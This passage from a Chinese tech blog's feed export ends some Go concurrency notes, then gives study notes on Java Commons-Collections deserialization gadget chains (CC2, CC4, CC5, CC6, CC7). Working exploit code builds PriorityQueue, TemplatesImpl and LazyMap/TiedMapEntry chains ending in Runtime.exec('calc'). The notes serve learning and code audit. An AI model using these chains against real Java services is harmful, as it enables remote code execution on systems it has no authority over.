class="line"></span><br><span class="line"><span class="comment">// for&#123;</span></span><br><span class="line"><span class="comment">// //当ok为false时，表示channel已经关闭且为空；否则返回true</span></span><br><span class="line"><span class="comment">// if data,ok := &lt;-c; ok&#123;</span></span><br><span class="line"><span class="comment">// fmt.Println(data)</span></span><br><span class="line"><span class="comment">// &#125;else&#123;</span></span><br><span class="line"><span class="comment">// break</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//可以使用range来不断迭代操作channel</span></span><br><span class="line"><span class="keyword">for</span> data := <span class="keyword">range</span> c &#123;</span><br><span class="line">fmt.Println(data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;main结束&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109210928897.png" alt="image-20230109210928897"></p><h2 id="6-使用select"><a href="#6-使用select" class="headerlink" title="6.使用select"></a>6.使用select</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fabonacii</span><span class="params">(c, quit <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">x, y := <span class="number">1</span>, <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> c &lt;- x:</span><br><span class="line"><span class="comment">//如果c可以写，就会进这个case</span></span><br><span class="line">t := y</span><br><span class="line">y, x = x+y, t</span><br><span class="line"><span class="keyword">case</span> &lt;-quit:</span><br><span class="line">fmt.Println(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">quit := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">6</span>; i++ &#123;</span><br><span class="line">fmt.Println(&lt;-c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">quit &lt;- <span class="number">0</span></span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">fabonacii(c, quit)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109211020027.png" alt="image-20230109211020027"></p><h1 id="十、即时通信系统"><a href="#十、即时通信系统" class="headerlink" title="十、即时通信系统"></a>十、即时通信系统</h1><p>跟着老师的课程，使用go语言写了一个即时通信系统的小例子，放在了我的github上</p><p>项目地址：<a href="https://github.com/feiweiliang/-golang-">https://github.com/feiweiliang/-golang-</a></p><p>实现的功能：</p><ul><li>更改用户名</li><li>公聊模式</li><li>私聊模式</li><li>查看当前在线用户</li><li>超时强踢</li></ul><p>项目截图：</p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109213153122.png" alt="image-20230109213153122"></p><p>未来打算学完gin之后，改成web界面版的即时通信系统</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 编程语言 </tag>
            
            <tag> 并发 </tag>
            
            <tag> 协程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC链学习笔记-CC2457</title>
      <link href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC2457/"/>
      <url>/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC2457/</url>
      
        <content type="html"><![CDATA[<blockquote><p>声明：本文为b站白日梦组长视频学习笔记，如有侵权，联系我速删</p><p>组长b站的传送门：<a href="https://space.bilibili.com/2142877265/?spm_id_from=333.999.0.0">https://space.bilibili.com/2142877265/?spm_id_from=333.999.0.0</a></p></blockquote><h1 id="CC4-CC2-CC5-CC7链"><a href="#CC4-CC2-CC5-CC7链" class="headerlink" title="CC4+CC2+CC5+CC7链"></a>CC4+CC2+CC5+CC7链</h1><blockquote><p>cc4和cc2是基于commonscollections4的</p></blockquote><h1 id="一、CC4"><a href="#一、CC4" class="headerlink" title="一、CC4"></a>一、CC4</h1><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC2457.assets/image-20220912125034342.png" alt="image-20220912125034342"></p><p>我们还是像挖掘commonscollections3的反序列化链一样，找找有没有调用transform的地方</p><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC2457.assets/image-20220912113240596.png" alt="image-20220912113240596"></p><p>这里是commonscollections4新增的一个比较器(3中也有但是没有实现seilazible接口)，在compare中调用了transform</p><p>接下来找一个调用compare()的地方，作者这里给出的是PriorityQueue类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//PriorityQueue</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">         siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>我们在PriorityQueue类中看到了一条完美的调用链</p><p><code>readObject() --&gt; heapify() --&gt; siftDown() --&gt; siftDownUsingComparator --&gt; TransformingComparator.compare</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br></pre></td></tr></table></figure><p>我们运行发现没有结果，因为有个条件需要满足</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想调用siftDown，就要满足(size &gt;&gt;&gt; 1 )大于等于1，也就是说要给队列传最少2个元素</p><p><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220912154530195.png" alt="image-20220912154530195" style="zoom:33%;"><img src="/.top//Document/typora同步/ctf/JAVA安全.assets/image-20220912154543303.png" alt="image-20220912154543303" style="zoom:33%;"></p><p>这里的话还是有一个问题，调用add()方法最终也会走到compare(),然后弹出计算器，还是老方法，先改一个transform,然后再反射改回来</p><p><strong>最终代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameFiled.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://Temp/classes/Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>());</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerFiled</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformerFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerFiled.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="二、CC2"><a href="#二、CC2" class="headerlink" title="二、CC2"></a>二、CC2</h1><blockquote><p>cc2与CC4的区别就在于没有使用InstantiateTransformer 调用TrAXFilter的构造方法来执行newTransformer（），而是直接用InvokerTransformer执行newTransformer,类似于CC3的InvokerTransformer版本</p></blockquote><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC2457.assets/image-20220912160734365.png" alt="image-20220912160734365"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameFiled.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://Temp/classes/Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        InvokerTransformer&lt;Object,Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerFiled</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformerFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerFiled.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="三、CC5"><a href="#三、CC5" class="headerlink" title="三、CC5"></a>三、CC5</h1><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC2457.assets/image-20220912162621457.png" alt="image-20220912162621457"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//BadAttributeValueExpException类</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (......) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TiedMapEntry类</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="四、CC7"><a href="#四、CC7" class="headerlink" title="四、CC7"></a>四、CC7</h1><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC2457.assets/image-20220912163558235.png" alt="image-20220912163558235"></p><p>未完待续。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> cc链 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC链学习笔记-CC6链</title>
      <link href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC6%E9%93%BE/"/>
      <url>/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC6%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>声明：本文为b站白日梦组长视频学习笔记，如有侵权，联系我速删</p><p>组长b站的传送门：<a href="https://space.bilibili.com/2142877265/?spm_id_from=333.999.0.0">https://space.bilibili.com/2142877265/?spm_id_from=333.999.0.0</a></p></blockquote><h1 id="CC6链"><a href="#CC6链" class="headerlink" title="CC6链"></a>CC6链</h1><blockquote><p>不限制JDK版本，不限制CC版本</p></blockquote><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC6%E9%93%BE.assets/image-20220807151800678.png" alt="image-20220807151800678"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TiedMapEntry类</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> ......; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HashMap类</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">......</span><br><span class="line">        putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这个思路，写出如下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="literal">null</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">serialize(hashMap);</span><br><span 